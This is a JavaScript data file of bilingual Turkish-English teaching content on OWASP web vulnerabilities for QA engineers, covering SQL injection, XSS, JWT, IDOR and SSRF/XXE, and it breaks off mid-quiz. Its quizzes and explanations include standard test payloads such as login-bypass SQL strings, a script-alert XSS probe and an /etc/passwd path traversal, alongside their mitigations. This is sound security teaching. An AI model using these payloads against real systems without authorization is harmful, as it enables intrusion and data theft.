// securityData.js — Web Penetration Testing & Siber Güvenlik learning content for QA Engineers
// Follows W3Schools atomic sidebar tab structure and the "2-2-2-2" pedagogical rule.

const trHero = {
  title: '🔒 Siber Güvenlik',
  subtitle: 'Web Penetration Testing, OWASP Top 10 zafiyetleri, interaktif simülasyonlar ve güvenlik otomasyonu',
  badge: 'WEB GÜVENLİĞİ VE PENETRATION TESTING',
}

const enHero = {
  title: '🔒 Cyber Security',
  subtitle: 'Web Penetration Testing, OWASP Top 10 vulnerabilities, interactive simulations and security automation',
  badge: 'WEB SECURITY AND PENETRATION TESTING',
}

const trTabs = [
  "🎯 Giriş & Güvenlik Zihniyeti",
  "1. SQL & NoSQL Injection",
  "2. Cross-Site Scripting (XSS)",
  "3. Broken Auth & JWT Security",
  "4. IDOR & Access Control",
  "5. XXE & SSRF (Server-Side)",
  "6. Security Misconfigurations",
  "7. Insecure Deserialization",
  "8. Business Logic Flaws",
  "9. Logging & Monitoring",
  "10. Sensitive Data Exposure",
  "💼 Mülakat Soruları (50 Soru)"
]

const enTabs = [
  "🎯 Intro & Security Mindset",
  "1. SQL & NoSQL Injection",
  "2. Cross-Site Scripting (XSS)",
  "3. Broken Auth & JWT Security",
  "4. IDOR & Access Control",
  "5. XXE & SSRF (Server-Side)",
  "6. Security Misconfigurations",
  "7. Insecure Deserialization",
  "8. Business Logic Flaws",
  "9. Logging & Monitoring",
  "10. Sensitive Data Exposure",
  "💼 Interview Questions (50 Qs)"
]

// ─────────────────────────────────────────────────────────────────────────────
// CURRICULUM SECTIONS WITH 2-2-2-2 RULE AND FEYNMAN CHECKPOINTS
// ─────────────────────────────────────────────────────────────────────────────
const sections = [
  // ── Tab 0: Intro ──────────────────────────────────────────────────────────
  {
    title: { tr: "🎯 Siber Güvenlik Zihniyeti & QA", en: "🎯 Security Mindset & QA" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🔒',
        content: {
          tr: "Siber güvenlik testleri, bir kalenin sadece kapısının kilitli olup olmadığını değil, gizli tünellerini, zayıf duvarlarını ve muhafızların rüşvet alıp almadığını kontrol etmeye benzer. QA mühendisleri olarak amacımız sadece uygulamanın çalışıp çalışmadığını değil, kötü niyetli bir canavarın onu kendi lehine manipüle edip edemeyeceğini bulmaktır.",
          en: "Cyber security testing is like checking if a castle not only has a locked door, but also scanning its secret tunnels, weak walls, and if the guards can be tricked. As QA engineers, our goal is not just to see if the app works, but to verify that a malicious monster cannot manipulate it for their own gain."
        }
      },
      {
        type: 'heading',
        text: { tr: "QA ve Siber Güvenlik İlişkisi", en: "The Link Between QA and Cyber Security" }
      },
      {
        type: 'text',
        content: {
          tr: "Geleneksel yazılım testleri pozitif ve negatif yollara odaklanırken, Penetration Testing (Sızma Testleri) hacker bakış açısıyla 'beklenmeyen yolları' zorlar. OWASP (Open Web Application Security Project) her yıl web uygulamalarındaki en tehlikeli 10 güvenlik açığını yayınlar. Bu modülde, bu 10 açığı bir çocuğun anlayacağı basitlikle ve interaktif animasyonlarla öğreneceğiz.",
          en: "While traditional software testing focuses on positive and negative flows, Penetration Testing pushes 'unexpected paths' with a hacker mindset. OWASP (Open Web Application Security Project) publishes the top 10 most critical security risks each year. In this module, we will explore these 10 risks with child-like simplicity and interactive animations."
        }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🛡️',
            label: { tr: "WAF (Web Application Firewall)", en: "WAF (Web Application Firewall)" },
            desc: { tr: "Uygulamanın önüne konulan akıllı bir muhafız gibidir. Gelen zararlı istekleri (SQLi, XSS) anında yakalar ve engeller.", en: "Like a smart castle guard standing in front of the application. It instantly detects and blocks malicious requests (SQLi, XSS)." }
          },
          {
            icon: '🧼',
            label: { tr: "Sanitization (Temizleme)", en: "Sanitization" },
            desc: { tr: "Kullanıcı girdilerinin içindeki tehlikeli kodların (ör. <script>) zararsız hale getirilmesi veya silinmesidir.", en: "Cleaning or modifying user inputs to make dangerous script tags (like <script>) completely harmless before processing." }
          }
        ]
      }
    ]
  },

  // ── Tab 1: SQL & NoSQL Injection ──────────────────────────────────────────
  {
    title: { tr: "1. SQL & NoSQL Injection", en: "1. SQL & NoSQL Injection" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🗝️',
        content: {
          tr: "SQL Injection, bir veritabanı dolabına normal bir isim yerine, dolabın tüm kilitlerini tek seferde açıp bütün çekmeceleri yere döken sihirli bir maymuncuk (örneğin: ' OR 1=1 --) sokmaya benzer.",
          en: "SQL Injection is like inserting a magic skeleton key (like ' OR 1=1 --) into a database locker instead of a normal name, causing all the locks to shatter and all drawers to spill their contents."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Benzetmelerle SQLi", en: "2 Analogies: Explaining SQLi" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Garson ve Mutfak Analojisi", en: "The Waiter and Kitchen Analogy" },
            desc: {
              tr: "Bir restoranda garsona 'Bana 3 numaralı yemeği getir ve mutfaktaki tüm gizli tarifleri çöpe at' dediğinde, garsonun bunu sorgulamadan yapmasıdır. SQLi, veritabanına giden komuta ekstra emirler sıkıştırmaktır.",
              en: "If you tell a restaurant waiter: 'Bring me food number 3 AND burn down the kitchen recipes', and they do it blindly. SQLi is slipping extra commands into a database instruction."
            }
          },
          {
            label: { tr: "Sihirli Kilitli Kutu", en: "The Magic Locked Box" },
            desc: {
              tr: "Kutunun üstündeki isim etiketine 'Ali veya 1 eşittir 1' yazdığında kutunun şaşırıp '1=1 her zaman doğrudur!' diyerek kapağını açmasıdır.",
              en: "Writing 'Ali OR 1 equals 1' on a box's label, and the box getting confused saying '1=1 is always true!' and popping open."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Oluşur?", en: "2 Reasonings: Why Does It Happen?" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '❓',
            label: { tr: "Kod ve Verinin Karışması", en: "Mixing Code and Data" },
            desc: {
              tr: "Güvenlik açığı, kullanıcının girdiği kelimelerin (verinin), veritabanına gönderilen emirlerle (kodla) birbirine yapışmasından kaynaklanır. Veritabanı girdiyi bir komut olarak yorumlar.",
              en: "The vulnerability occurs when user-supplied text (data) is directly glued into SQL queries (code). The database engine mistakes data for actual database instructions."
            }
          },
          {
            icon: '🛠️',
            label: { tr: "Parametrelendirmenin Olmaması", en: "Lack of Parameterization" },
            desc: {
              tr: "Java'da PreparedStatement kullanmak yerine `SELECT * FROM users WHERE name = '` + input + `'` şeklinde string birleştirme yapılırsa SQLi kaçınılmaz olur.",
              en: "Gluing strings directly in code like `SELECT * FROM users WHERE name = '` + input + `'` instead of using Java's PreparedStatement parameters makes SQLi inevitable."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: LEGO Yapboz Mantığı", en: "2 LEGO Analogies: Building Safely" }
      },
      {
        type: 'security-lego-visual',
        variant: 'sqli'
      },
      {
        type: 'heading',
        text: { tr: "Zafiyet Simülasyonu", en: "Vulnerability Simulation" }
      },
      {
        type: 'security-simulation',
        variant: 'sqli'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Hangi SQL girdisi, veritabanını kandırarak şifresiz giriş yapmayı sağlayabilir?",
          en: "Which SQL input can trick the database into logging in without a password?"
        },
        options: [
          { id: 'a', text: "admin" },
          { id: 'b', text: "admin' OR '1'='1" },
          { id: 'c', text: "SELECT * FROM users" },
          { id: 'd', text: "admin' AND password='123" }
        ],
        correct: 'b',
        explanation: {
          tr: "admin' OR '1'='1 girdisindeki tırnak işareti mevcut SQL komutunu kırar, ardından gelen OR '1'='1 koşulu her zaman doğru (true) sonuç vereceğinden şifre kontrolü atlanır.",
          en: "The quote in admin' OR '1'='1 breaks the query wrapper, and the appended OR '1'='1 evaluates to true, overriding the password validation check."
        },
        retryQuestion: {
          question: {
            tr: "SQL Injection açığını engellemek için kod tarafında ne kullanılmalıdır?",
            en: "What should be used in code to completely prevent SQL Injection?"
          },
          options: [
            { id: 'a', text: { tr: "String Birleştirme (+)", en: "String Concatenation (+)" } },
            { id: 'b', text: { tr: "Parametrelendirilmiş Sorgular (Prepared Statements)", en: "Parameterized Queries (Prepared Statements)" } },
            { id: 'c', text: { tr: "Daha uzun şifreler", en: "Longer password strings" } },
            { id: 'd', text: { tr: "iFrame engelleme", en: "Blocking iframe elements" } }
          ],
          correct: 'b',
          explanation: {
            tr: "Prepared Statements (Parametrelendirilmiş Sorgular) kullanıcı girdilerini SQL komut yapısından ayırarak sadece veri olarak işler, böylece SQLi engellenir.",
            en: "Prepared Statements isolate user inputs from the query structure, handling them strictly as parameters, preventing SQL Injection."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Bir SQL Injection (SQL Enjeksiyonu) açığını, siber güvenlikten hiç anlamayan 5 yaşındaki bir çocuğa dolap ve maymuncuk benzetmesiyle nasıl anlatırsın?",
          en: "How would you explain a SQL Injection vulnerability to a 5-year-old child using a toy box or cabinet analogy?"
        },
        keywords: [
          ["dolap", "cabinet", "box"],
          ["kilit", "lock", "key"],
          ["sihirli", "magic", "maymuncuk", "skeleton key"],
          ["veri", "oyuncak", "toy", "cheats"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "SQL veritabanı oyuncak çekmeceleri olan büyük bir dolap gibidir. Normalde sadece kendi adını söyleyip kendi çekmeceni açabilirsin. Ama kötü niyetli biri isim yerine sihirli bir maymuncuk kelimesi fısıldadığında dolabın tüm kilitleri patlar ve bütün çocukların oyuncakları yere dökülür. Buna SQL enjeksiyonu denir.",
          en: "A database is like a big toy cabinet. Normally you say your name and only open your drawer. But if a sneaky kid whispers a magic key word, all drawer locks pop open and every toy spills on the floor. That is SQL Injection."
        }
      }
    ]
  },

  // ── Tab 2: Cross-Site Scripting (XSS) ─────────────────────────────────────
  {
    title: { tr: "2. Cross-Site Scripting (XSS)", en: "2. Cross-Site Scripting (XSS)" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '👾',
        content: {
          tr: "XSS, bir okul panosuna ilan asmak yerine, panoya bakan herkesin cebindeki harçlığı çalan sihirli/bombalı bir yapışkan kağıt (tehlikeli JavaScript kodu) yapıştırmaya benzer.",
          en: "XSS is like posting a sticky note with a small hidden trick device on a school bulletin board that steals the lunch money of anyone who looks at the board."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: XSS Kavramı", en: "2 Analogies: Explaining XSS" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Zehirli İlan Panosu", en: "Poisoned Bulletin Board" },
            desc: {
              tr: "Panoya asılan mesajda `<script>harcliklariCal()</script>` yazar. Bu panoya bakan her öğrenci (ziyaretçi tarayıcısı) bu yazıyı okurken komutu çalıştırır ve parası çalınır.",
              en: "The bulletin message says `<script>stealMoney()</script>`. Every student reading the board (user browser) executes the script, triggering cookie theft."
            }
          },
          {
            label: { tr: "Hileli Mektup Zarfı", en: "Tricky Postal Envelope" },
            desc: {
              tr: "Postacı mektubu getirir. Mektubu açan sekreter mektubun içindeki 'Çekmeceyi aç ve anahtarı pencereden dışarı fırlat!' emrini okur okumaz hipnotize olup yapar.",
              en: "A postman delivers a letter. As soon as the secretary opens the letter and reads the command 'Open the safe and throw keys out!', she does it immediately."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Oluşur?", en: "2 Reasonings: Why Does It Happen?" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🧠',
            label: { tr: "Tarayıcının Kör İnancı", en: "Browser's Blind Trust" },
            desc: {
              tr: "Tarayıcılar (Chrome/Firefox), sunucudan gelen HTML kodlarının içindeki komutları çalıştıracak şekilde tasarlanmıştır. Güvenilir ve güvensiz kod ayrımı yapamazlar.",
              en: "Web browsers are designed to interpret and execute script tags sent from servers. They cannot tell if a script was written by the owner or injected by a hacker."
            }
          },
          {
            icon: '🧼',
            label: { tr: "HTML Escaping Eksikliği", en: "Lack of HTML Escaping" },
            desc: {
              tr: "Kullanıcı girdisi olan `<` karakteri `&lt;` şeklinde kodlanmazsa, tarayıcı bunu düz yazı değil yeni bir HTML etiketi (tag) olarak algılar.",
              en: "If input brackets like `<` are not encoded to safe strings like `&lt;`, the browser interprets it as an active HTML tag instead of static text."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: LEGO XSS Önleme", en: "2 LEGO Analogies: Sanitization Blocks" }
      },
      {
        type: 'security-lego-visual',
        variant: 'xss'
      },
      {
        type: 'heading',
        text: { tr: "Zafiyet Simülasyonu", en: "Vulnerability Simulation" }
      },
      {
        type: 'security-simulation',
        variant: 'xss'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Bir web sayfasında XSS zafiyeti olduğunu doğrulamak için en sık kullanılan zararsız test girdisi hangisidir?",
          en: "Which harmless test payload is most commonly used to verify XSS vulnerabilities?"
        },
        options: [
          { id: 'a', text: "SELECT * FROM secrets" },
          { id: 'b', text: "<script>alert('XSS')</script>" },
          { id: 'c', text: "admin / admin" },
          { id: 'd', text: "../../../../etc/passwd" }
        ],
        correct: 'b',
        explanation: {
          tr: "<script>alert('XSS')</script> girdisi tarayıcıda bir uyarı kutusu (popup) çıkartır. Bu kutu çıkıyorsa sayfada kod çalıştırılabildiği kanıtlanır.",
          en: "<script>alert('XSS')</script> causes a pop-up alert box in the browser. If the box appears, it proves client-side scripts can execute."
        },
        retryQuestion: {
          question: {
            tr: "XSS açığı ile saldırgan en çok hangi veriyi çalmayı hedefler?",
            en: "What type of data does an attacker target most frequently with XSS?"
          },
          options: [
            { id: 'a', text: { tr: "Kullanıcı Oturum Çerezleri (Session Cookies)", en: "Session Cookies / JWT Tokens" } },
            { id: 'b', text: { tr: "Sunucudaki veritabanı şifreleri", en: "Server database passwords" } },
            { id: 'c', text: { tr: "Sistem dosyaları (/etc/passwd)", en: "System files (/etc/passwd)" } },
            { id: 'd', text: { tr: "CPU fan hızı bilgileri", en: "CPU fan speed logs" } }
          ],
          correct: 'a',
          explanation: {
            tr: "XSS tarayıcıda çalıştığı için, o tarayıcıdaki oturum anahtarlarını (Session Cookies / LocalStorage tokens) çalarak hesabı ele geçirmek ana hedeftir.",
            en: "Since XSS executes inside the victim's browser, stealing session cookies to hijack their login session is the primary goal."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Cross-Site Scripting (XSS) zafiyetini, tarayıcının kötü niyetli bir kodu nasıl gerçek ilan sanıp çalıştırdığını çocuksu kelimelerle açıkla.",
          en: "Explain Cross-Site Scripting (XSS) and how a browser gets tricked into running a bad command, using child-like words."
        },
        keywords: [
          ["pano", "board", "post"],
          ["tarayıcı", "browser", "göz", "eye"],
          ["kod", "script", "bomb", "bomba"],
          ["çerez", "cookie", "kurabiye", "para", "money"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Bir ilan panonun üstüne tatlı canavarlar bakıp mektuplar okuyor. Kötü biri panoya gizli bir bomba kodu yapıştırıyor. Canavar panodaki bu kodu okuduğunda tarayıcı hipnotize oluyor ve çantasındaki kurabiyeleri (çerezleri) hırsıza fırlatıyor. İşte bu XSS'tir.",
          en: "Cute monsters look at a school board. A sneaky goblin pins a message with a hidden hypnotizing script. When a monster reads it, they instantly throw their delicious cookies to the goblin. That is XSS."
        }
      }
    ]
  },

  // ── Tab 3: Broken Authentication & JWT Security ──────────────────────────
  {
    title: { tr: "3. Broken Auth & JWT Security", en: "3. Broken Auth & JWT Security" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🎟️',
        content: {
          tr: "Broken Authentication, bir lunapark girişinde bilet satan görevlinin, boya kalemiyle çizilmiş sahte bir VIP biletini (JWT token) hiç kontrol etmeden kabul edip içeriye kaçak ziyaretçi almasına benzer.",
          en: "Broken Authentication is like an amusement park ticket collector accepting a VIP wristband drawn with crayons (forged JWT token) without verifying the official stamp."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Kimlik Doğrulama Hataları", en: "2 Analogies: Broken Authentication" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Mühürsüz Bilet", en: "The Unsealed Ticket" },
            desc: {
              tr: "JWT token'ı lunaparka girmek için verilen bir bilekliktir. Üzerinde lunapark müdürü yerine sıradan biri imza atmıştır ancak kapıdaki görevli (API) imzayı kontrol etmeyi unutur.",
              en: "A JWT is a wristband. If the security guard forgets to check the manager's official holographic stamp, anyone can sign a blank band with a sharpie."
            }
          },
          {
            label: { tr: "Kaba Kuvvet (Brute Force) Girişi", en: "Brute Force Locksmith" },
            desc: {
              tr: "Kapıyı kilitleyen kişinin, hırsızın binlerce anahtar denemesine izin vermesidir. Güvenli sistemlerde 5 denemeden sonra kapı kilitlenir (Rate Limiting).",
              en: "Allowing a lockpicker to try millions of key combinations forever. Safe systems lock the vault after 5 failed attempts (Rate Limiting)."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Oluşur?", en: "2 Reasonings: Why Authentication Breaks" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🕵️',
            label: { tr: "Zayıf JWT İmzası (None Algorithm)", en: "Weak JWT Signature (None Algorithm)" },
            desc: {
              tr: "Bazı JWT kütüphanelerinde imza algoritması `none` olarak ayarlanırsa, sunucu imza doğrulamasını tamamen atlar. Saldırgan sadece payload kısmını değiştirerek admin olur.",
              en: "If the JWT verification library accepts `alg: none`, it skips signing checks. An attacker changes their role to 'admin', removes the signature, and gains access."
            }
          },
          {
            icon: '🛑',
            label: { tr: "Oturum Kapatma Eksikliği", en: "Lack of Session Invalidation" },
            desc: {
              tr: "Kullanıcı çıkış yaptığında token sunucu tarafında iptal edilmezse, eski token kopyalanıp saklandığı sürece sisteme girmek için kullanılabilir.",
              en: "If token registers are not cleared on the server side during logout, the old token remains valid forever and can be stolen to hijack sessions."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: Güvenli Bilet Kontrolü", en: "2 LEGO Analogies: Ticket Seals" }
      },
      {
        type: 'security-lego-visual',
        variant: 'jwt'
      },
      {
        type: 'heading',
        text: { tr: "Zafiyet Simülasyonu", en: "Vulnerability Simulation" }
      },
      {
        type: 'security-simulation',
        variant: 'jwt'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "JWT token'ların bütünlüğünü ve sahte olup olmadığını garanti eden en kritik bölüm hangisidir?",
          en: "Which part of a JWT token ensures its integrity and prevents tampering?"
        },
        options: [
          { id: 'a', text: "Header" },
          { id: 'b', text: "Payload" },
          { id: 'c', text: "Signature (İmza)" },
          { id: 'd', text: "Username" }
        ],
        correct: 'c',
        explanation: {
          tr: "Signature (İmza) kısmı Header ve Payload bilgilerinin gizli bir şifre (secret key) ile hash'lenmesiyle oluşur. Bu imza değişmeden veriyi değiştirmek imkansızdır.",
          en: "The Signature part is generated by hashing the header and payload using a secret key. A tampered token will fail signature verification checks."
        },
        retryQuestion: {
          question: {
            tr: "Kimlik doğrulamayı kaba kuvvet (brute force) saldırılarına karşı korumak için hangi önlem alınmalıdır?",
            en: "What configuration prevents brute force attacks on authentication systems?"
          },
          options: [
            { id: 'a', text: { tr: "SSL Sertifikası ekleme", en: "Adding SSL certificates" } },
            { id: 'b', text: { tr: "Hız Sınırlaması (Rate Limiting) ve Hesap Kilitleme", en: "Rate Limiting and Account Lockout" } },
            { id: 'c', text: { tr: "Bütün kullanıcıları silme", en: "Deleting all idle accounts" } },
            { id: 'd', text: { tr: "SQL veritabanını kapatma", en: "Shutting down the database server" } }
          ],
          correct: 'b',
          explanation: {
            tr: "Hız sınırlandırması (Rate Limiting) belirli bir sürede girilebilecek maksimum istek sayısını kısıtlar, böylece brute force engellenir.",
            en: "Rate limiting restricts the maximum number of login requests per time interval, stopping brute force script attacks."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "JWT token imzalamasının neden önemli olduğunu ve imza kontrol edilmezse ne olacağını lunapark bileti örneğiyle açıkla.",
          en: "Explain why JWT signature validation is crucial and what happens if it is skipped, using a ticket analogy."
        },
        keywords: [
          ["bilet", "ticket", "wristband"],
          ["imza", "signature", "stamp", "mühür"],
          ["kontrol", "check", "verify"],
          ["sahte", "fake", "crayons", "boya"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "JWT, lunaparktaki VIP bilekliği gibidir. Üstünde gizli bir kral mührü (imza) olmalıdır. Eğer kapıdaki görevli bu mührü büyüteçle kontrol etmezse (imza doğrulaması atlanırsa), hırsızlar boya kalemleriyle sahte VIP biletleri çizip içeri sızarlar. Bu yüzden imza kontrolü şarttır.",
          en: "JWT is like an amusement park wristband. It has an official manager's stamp. If the ticket checker skips looking at the stamp, anyone can draw a fake wristband with crayons and sneak in. Signature checks prevent fake tickets."
        }
      }
    ]
  },

  // ── Tab 4: IDOR & Broken Access Control ──────────────────────────────────
  {
    title: { tr: "4. IDOR & Access Control", en: "4. IDOR & Access Control" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🏡',
        content: {
          tr: "IDOR, yan yana duran renkli LEGO evlerinin kapı numarasını (userId=5 yerine userId=6) değiştirerek, yan komşunun evinin kapısını 'çat' diye açıp gizli oyuncak sandığına bakmaya benzer.",
          en: "IDOR is like walking down a street of Lego houses and changing the house ID (from userId=5 to userId=6) in the URL to open your neighbor's front door and access their private toy box."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Yetkilendirme Hataları", en: "2 Analogies: IDOR Vulnerabilities" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Otel Odası Anahtarı", en: "The Hotel Room Key" },
            desc: {
              tr: "Sadece otel odandaki numara levhasını söküp yan kapıya takınca anahtarının o odayı da açmasıdır. Kapı (sunucu) oda numarasını seninle eşleştirmez.",
              en: "If you physically swap the numbers on hotel doors and your room card opens the neighbor's room. The lock checks only the number, not who holds the card."
            }
          },
          {
            label: { tr: "Kargo Takip Numarası", en: "Parcel Tracking ID" },
            desc: {
              tr: "URL'deki kargo numarasını 1 artırdığında, sisteme login olmana rağmen başkasına ait kargo teslim adresini ve telefonunu görebilmendir.",
              en: "Changing the tracking number in your shipping URL by 1 digit and seeing someone else's full delivery details, address, and name."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Oluşur?", en: "2 Reasonings: Why IDOR Occurs" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🛑',
            label: { tr: "Sadece Giriş Kontrolü Yapmak", en: "Only Checking Authenticated Status" },
            desc: {
              tr: "Sistem kullanıcının login olduğunu kontrol eder (Authentication) ancak erişmek istediği kaydın (örneğin fatura ID=105) ona ait olup olmadığını (Authorization) sorgulamaz.",
              en: "Developers verify that the user is logged in, but fail to check if the specific object requested (like invoice ID=105) actually belongs to the active user."
            }
          },
          {
            icon: '🔢',
            label: { tr: "Sıralı/Tahmin Edilebilir Kimlikler", en: "Predictable Database Identifiers" },
            desc: {
              tr: "Veritabanı kayıtlarının sıralı tam sayılar (1, 2, 3...) olması saldırganın tahmin yürütmesini kolaylaştırır. UUID (ör. d3b07384d-...) kullanmak bunu zorlaştırır.",
              en: "Using auto-increment IDs (1, 2, 3...) makes guessing trivial. Implementing randomized GUIDs/UUIDs helps mask direct database resources."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: IDOR Engelleme", en: "2 LEGO Analogies: Access Verification Bricks" }
      },
      {
        type: 'security-lego-visual',
        variant: 'idor'
      },
      {
        type: 'heading',
        text: { tr: "Zafiyet Simülasyonu", en: "Vulnerability Simulation" }
      },
      {
        type: 'security-simulation',
        variant: 'idor'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Aşağıdaki URL'lerden hangisi IDOR (Insecure Direct Object Reference) zafiyetine en açık yapıdadır?",
          en: "Which of the following URLs is most susceptible to an IDOR exploit?"
        },
        options: [
          { id: 'a', text: "https://shop.com/api/getInvoice?id=1025" },
          { id: 'b', text: "https://shop.com/api/getInvoice?id=d29038d1-12f3" },
          { id: 'c', text: "https://shop.com/api/my-profile" },
          { id: 'd', text: "https://shop.com/api/searchProducts?query=shoes" }
        ],
        correct: 'a',
        explanation: {
          tr: "Sıralı giden id=1025 parametresi, bir kontrol eksikliği varsa id=1026 yapılarak başka faturaların kolayca görüntülenmesini sağlar (IDOR).",
          en: "An integer ID like id=1025 is sequential and easily guessable. Changing it to 1026 allows attackers to scan and retrieve other client invoices."
        },
        retryQuestion: {
          question: {
            tr: "IDOR açığını kökten çözmek için en güvenli yaklaşım hangisidir?",
            en: "What is the most robust way to mitigate IDOR vulnerabilities?"
          },
          options: [
            { id: 'a', text: { tr: "URL'leri kullanıcılardan gizlemek", en: "Hiding URL text fields from users" } },
            { id: 'b', text: { tr: "Her istekte kullanıcı yetki ve sahiplik kontrolünü sunucu tarafında doğrulamak", en: "Validating user ownership of the requested resource on the server side for every request" } },
            { id: 'c', text: { tr: "Sadece karmaşık CSS kullanmak", en: "Using complex CSS style properties" } },
            { id: 'd', text: { tr: "Kullanıcı kayıtlarını şifrelemek", en: "Encrypting database backups" } }
          ],
          correct: 'b',
          explanation: {
            tr: "Erişilmek istenen verinin (Invoice 1025) talepte bulunan aktif kullanıcıya (User A) ait olup olmadığı sunucuda doğrulanmalıdır (Authorization check).",
            en: "The server must check authorization dynamically, verifying if Invoice 1025 belongs to the authenticated user profile before returning the database payload."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "IDOR (Insecure Direct Object Reference) açığını, 5 yaşındaki bir çocuğa lego evleri ve kapı numaraları üzerinden anlat.",
          en: "Explain IDOR to a 5-year-old child using lego houses, door blocks, and toys."
        },
        keywords: [
          ["ev", "house", "komşu", "neighbor"],
          ["numara", "number", "id", "5", "6"],
          ["kapı", "door", "kilit", "lock"],
          ["oyuncak", "toy", "kutu", "box"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Yan yana LEGO evleri var. Benim evim 5 numara. Evimin kapı numarasını söküp yerine 6 yazıyorum. Evin muhafızı (server) bana inanıp 6 numaralı komşunun kapısını açıyor ve oradaki oyuncakları almama izin veriyor. Buna IDOR denir.",
          en: "There are Lego houses. My house block is 5. I switch the block to 6. The guard thinks I own house 6 and lets me enter to steal my neighbor's secret toys. This is IDOR."
        }
      }
    ]
  },

  // ── Tab 5: XXE & SSRF ────────────────────────────────────────────────────
  {
    title: { tr: "5. XXE & SSRF (Server-Side)", en: "5. XXE & SSRF (Server-Side)" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🏰',
        content: {
          tr: "SSRF, bir sunucu kalesindeki muhafız robotunu kandırıp, normalde dışarıdan girilmeyen kalenin en altındaki gizli mahzen odasına (kendi iç ağı / localhost) giderek oradaki şifreleri getirmesini istemeye benzer.",
          en: "SSRF is like tricking a server castle guard robot into walking into the castle's internal vaults (like localhost:8080/admin) to fetch secret documents, because the robot blindly trusts request paths."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Sunucu Tarafı Saldırıları", en: "2 Analogies: Server-Side Request Forgery" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Kandırlan Kale Muhafızı (SSRF)", en: "The Tricked Guard (SSRF)" },
            desc: {
              tr: "Muhafıza 'Git şu adresteki resmi getir' dersin. Muhafız kalenin dışına değil, kalenin içindeki gizli cephaneliğe (`http://localhost/admin`) gider ve oradaki gizli planları alıp sana verir.",
              en: "You ask the guard: 'Fetch me the image at this URL'. Instead of external links, you write an internal path. The guard fetches the private admin configs and leaks them."
            }
          },
          {
            label: { tr: "Zehirli Kitap Ayracı (XXE)", en: "The XML Entity Bookmarker (XXE)" },
            desc: {
              tr: "Okuyucuya (XML parser) bir kitap verirsin. Kitabın içine 'Harici Varlık (Entity) olarak evdeki gizli kasadaki evrakı oku' talimatı yazılmıştır. Okuyucu kitabı okurken kasayı da açar.",
              en: "You hand a script to a reader. The script contains instructions like 'Resolve entity: read local file /etc/passwd'. The reader prints the file contents in output."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Tehlikelidir?", en: "2 Reasonings: Why It Is Dangerous" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🤖',
            label: { tr: "İç Ağa Güven Duygusu", en: "Implicit Trust in localhost" },
            desc: {
              tr: "Sunucular kendi iç ağlarındaki servislere (localhost:8080, AWS metadata endpoint) genellikle şifre sormadan güvenirler. SSRF bu güveni sömürür.",
              en: "Internal services (like localhost database admin consoles or cloud metadata endpoints) often bypass passwords because they trust local server IPs. SSRF exploits this."
            }
          },
          {
            icon: '📁',
            label: { tr: "Varsayılan XML Ayarları", en: "Default XML Entity Resolving" },
            desc: {
              tr: "Pek çok eski XML okuyucu kütüphane, harici varlık (External Entity) çözümlemeyi varsayılan olarak açık tutar. Bu da XXE saldırılarına zemin hazırlar.",
              en: "Many older XML parsers enable external entity parsing by default. Attackers pass custom DTD directives to read local system configuration files (XXE)."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: SSRF/XXE Koruma", en: "2 LEGO Analogies: Guarding Castle Walls" }
      },
      {
        type: 'security-lego-visual',
        variant: 'ssrf'
      },
      {
        type: 'heading',
        text: { tr: "Zafiyet Simülasyonu", en: "Vulnerability Simulation" }
      },
      {
        type: 'security-simulation',
        variant: 'ssrf'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
